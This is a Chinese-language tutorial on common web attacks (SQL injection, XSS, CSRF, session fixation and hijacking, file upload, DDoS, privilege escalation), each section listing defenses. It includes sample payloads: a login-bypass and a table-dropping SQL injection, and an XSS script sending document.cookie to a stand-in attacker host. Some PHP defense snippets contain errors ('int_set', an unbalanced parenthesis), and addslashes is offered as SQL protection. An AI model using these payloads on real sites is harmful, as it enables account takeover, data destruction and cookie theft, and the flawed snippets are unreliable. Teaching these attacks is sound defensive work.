# 攻击及防御

## SQL注入（SQL Injection）
攻击者把SQL命令插入到Web表单的输入域或页面请求的字符串，服务器使用参数构建数据库SQL命令时，恶意SQL被一起构造，并在数据库中执行。

在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。

`' or '1'= '1`是最常见的sql注入攻击。

比如在登录页面中输入的内容直接用来构造动态的SQL命令，或者直接用作存储过程的参数：
```sql
SELECT * from Users WHERE login = '$username' AND password = '$password';
```

当攻击者输入的内容为`' or '1'= '1`时，得到的SQL命令变成：
```sql
SELECT * from Users WHERE login = '' or '1'='1' AND password = '' or '1'='1'；
```
这个时候1=1是成立，自然就跳过验证了。

但是如果再严重一点，密码输如的是';drop table user;--，那么sql命令为：
```sql
SELECT * from Users WHERE login = '' or '1'='1' AND password = '';drop table user;--'
```

防范：
1. 绑定变量，使用预处理语句，如PDO或MySQLi的`prepare()`
2. 过滤特殊符号，对参数进行转义，如PHP的`addslashes()`和`str_replace()`
3. 检查变量数据类型和格式

## 跨网站脚本攻击(Cross Site Scripting, XSS)
指攻击者在网页中嵌入恶意脚本程序，其他用户在加载网页时就会执行代码，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。这些恶意代码通常是JavaScript、HTML以及其他客户端脚本语言。

攻击者在网站发表评论：
```html
<script>window.open(“www.gongji.com?param=”+document.cookie)</script>
```
如果没有对输入内容进行处理，直接存储到数据库，当其他用户访问到此评论时，浏览器执行了这段脚本，就会把该用户的cookie发送到攻击者的服务器了。

防范：
1. 将输入的数据进行转义处理，将特殊字符转换成HTML编码，过滤输出的变量，比如将`<`转义成`&lt`，PHP可使用函数`htmlspecialchars()`

## 跨网站请求伪造攻击(Cross Site Request Forgeries, CSRF)

通过伪装成受信任的用户，以合法的用户的身份进行非法操作。

通俗的讲就是说我访问了A网站，然后cookie存在了浏览器，然后我又访问了一个流氓网站，不小心点了流氓网站一个链接（向A发送请求），这个时候流氓网站利用了我的身份对A进行了访问。

攻击者盗用你的身份，以你的名义向第三方网站发送恶意请求。CRSF能做的事情包括利用你的身份发邮件，发短信，进行交易转账，甚至盗取账号信息。

攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。

攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达到攻击者的目的。

它与XSS的攻击方法不同，XSS利用漏洞影响站点内的用户，攻击目标是同一站点内的用户者，而CSRF 通过伪装成受害用户发送恶意请求来影响Web系统中受害用户的利益。

例如:
我登录了A银行网站，然后我又访问了室友给的一个流氓网站，然后点了里面的一个链接`www.A.com/transfer?account=666&money=10000`,那么这个时候很可能我就向账号为666的人转了1w软妹币。

注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接，比如说一个图片。

防范方法：
1. token机制。在HTTP请求中进行token验证，如果请求中没有token或者token内容不正确，则认为CSRF攻击而拒绝该请求。
2. 增加referer识别。在HTTP Header中有一个字段Referer，它记录了HTTP请求的来源地址。如果Referer是其他网站，就有可能是CSRF攻击，则拒绝该请求。但是，服务器并非都能取到Referer。很多用户出于隐私保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，例如HTTPS跳转到HTTP。

## Session固定攻击(Session Fixation)
攻击者预先设定session id，让合法用户使用这个session id来访问被攻击的应用程序，一旦用户的会话ID被成功固定，攻击者就可以通过此session id来冒充用户访问应用程序。

例如:
1. 攻击者访问网站http:///www.bank.com，获取他自己的session id，如：SID=123；
2. 攻击者给目标用户发送链接，并带上自己的session id，如：http:///www.bank.com/?SID=123；
3. 目标用户点击了http:///www.bank.com/?SID=123，像往常一样，输入自己的用户名、密码登录到网站；
4. 由于服务器的session id不改变，现在攻击者点击http:///www.bank.com/?SID=123，他就拥有了目标用户的身份，可以为所欲为了。

防范方法：
1.定期更改session id
```php
session_regenerate_id(TRUE);//删除旧的session文件，每次都会产生一个新的session id。默认false，保留旧的session
```
2. 更改session的名称，session的默认名称是PHPSESSID，此变量会保存在cookie中，如果攻击者不抓包分析，就不能猜到这个名称，阻挡部分攻击
```php
session_name("mysessionid");
```
3. 关闭透明化session id，透明化session id指当浏览器中的http请求没有使用cookie来制定session id时，sessioin id使用链接来传递
```ini
int_set("session.use_trans_sid", 0);
```
4. 只从cookie检查session id
```ini
int_set("session.use_cookies", 1);//表示使用cookies存放session id
int_set("session.use_only_cookies", 1);//表示只使用cookies存放session id
```
5. 使用URL传递隐藏参数
```php
$sid = md5(uniqid(rand()), TRUE));
$_SESSION["sid"] = $sid;//攻击者虽然能获取session数据，但是无法得知$sid的值，只要检查sid的值，就可以确认当前页面是否是web程序自己调用的
```

## Session劫持攻击(Session Hijacking)
攻击者利用各种手段来获取目标用户的session id。一旦获取到session id，那么攻击者可以利用目标用户的身份来登录网站，获取目标用户的操作权限。

攻击者获取目标用户session id的方法:
1. 暴力破解:尝试各种session id，直到破解为止;
2. 计算:如果session id使用非随机的方式产生，那么就有可能计算出来;
3. 窃取:使用网络截获，xss攻击等方法获得

防范方法：
1. 定期更改session id
2. 更改session的名称
3. 关闭透明化session id
4. 设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。

## 文件上传漏洞攻击(File Upload Attack)
攻击者利用程序缺陷绕过系统对文件的验证与处理策略，上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务端命令的能力。

许多第三方框架、服务，都曾经被爆出文件上传漏洞，可能被一旦被攻击者上传恶意代码，有可能服务端就被人黑了。

防范方法：
1. 文件上传的目录设置为不可执行。
2. 判断文件类型，设置白名单。在判断文件类型的时候，可以结合使用MIME Type，后缀检查等方式。因为对于上传文件，不能简单地通过后缀名称来判断文件的类型，因为攻击者可以将可执行文件的后缀名称改为图片或其他后缀类型，诱导用户执行。对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码；
3. 上传的文件需要进行重新命名，使用随机数改写文件名和文件路径，使攻击者无法猜想上传文件的访问路径，将极大地增加攻击成本；像shell、.php 、.rar和crossdomain.xml这种文件，，因为重命名而无法成功实施攻击。
4.单独设置文件服务器的域名：由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。

## 分布式拒绝服务攻击（Distributed Denial of Service）DDOS
发送大量请求是使服务器瘫痪。DDos攻击是在DOS攻击基础上的，可以通俗理解，dos是单挑，而ddos是群殴，因为现代技术的发展，dos攻击的杀伤力降低，所以出现了DDOS，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击。

案例
SYN Flood：

在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的 TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD 状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态。

SYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的IP地址，向服务器不断地发送SYN包，服务器回复确认包，并等待客户的确认。由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。

SYN 攻击是一种典型的 DoS/DDoS 攻击。

CC攻击，在应用层http协议上发起攻击，模拟正常用户发送大量请求直到该网站拒绝服务为止。

在流量较大的网站上挂XSS对小网站访问，也有可能造成DDOS攻击。

防范：
- 最直接的方法增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。
- 云服务提供商有自己的一套完整DDoS解决方案，并且能提供丰富的带宽资源

## 越权攻击
一般来说，“基于URL的访问控制”是最常见的。

### 垂直权限管理
访问控制实际上是建立用户与权限之间的对应关系，即“基于角色的访问控制”，RBAC。不同角色的权限有高低之分。高权限角色访问低权限角色的资源往往是被允许的，而低权限角色访问高权限的资源往往被禁止的。在配置权限时，应当使用“最小权限原则”，并使用“默认拒绝”的策略，只对有需要的主体单独配置”允许”的策略，这在很多时候能够避免发生“越权访问”。

### 水平权限管理
水平权限问题在同一个角色上，系统只验证了访问数据的角色，没有对角色内的用户做细分，由于水平权限管理是系统缺乏一个数据级的访问控制所造成的，因此水平权限管理又可以称之为“基于数据的访问控制”。

比如电商网站访问订单信息，如果没有做水平权限管理，即只能访问自己的订单信息，那么就可以通过穷举的方式伪造订单号，查看所有人的订单信息。
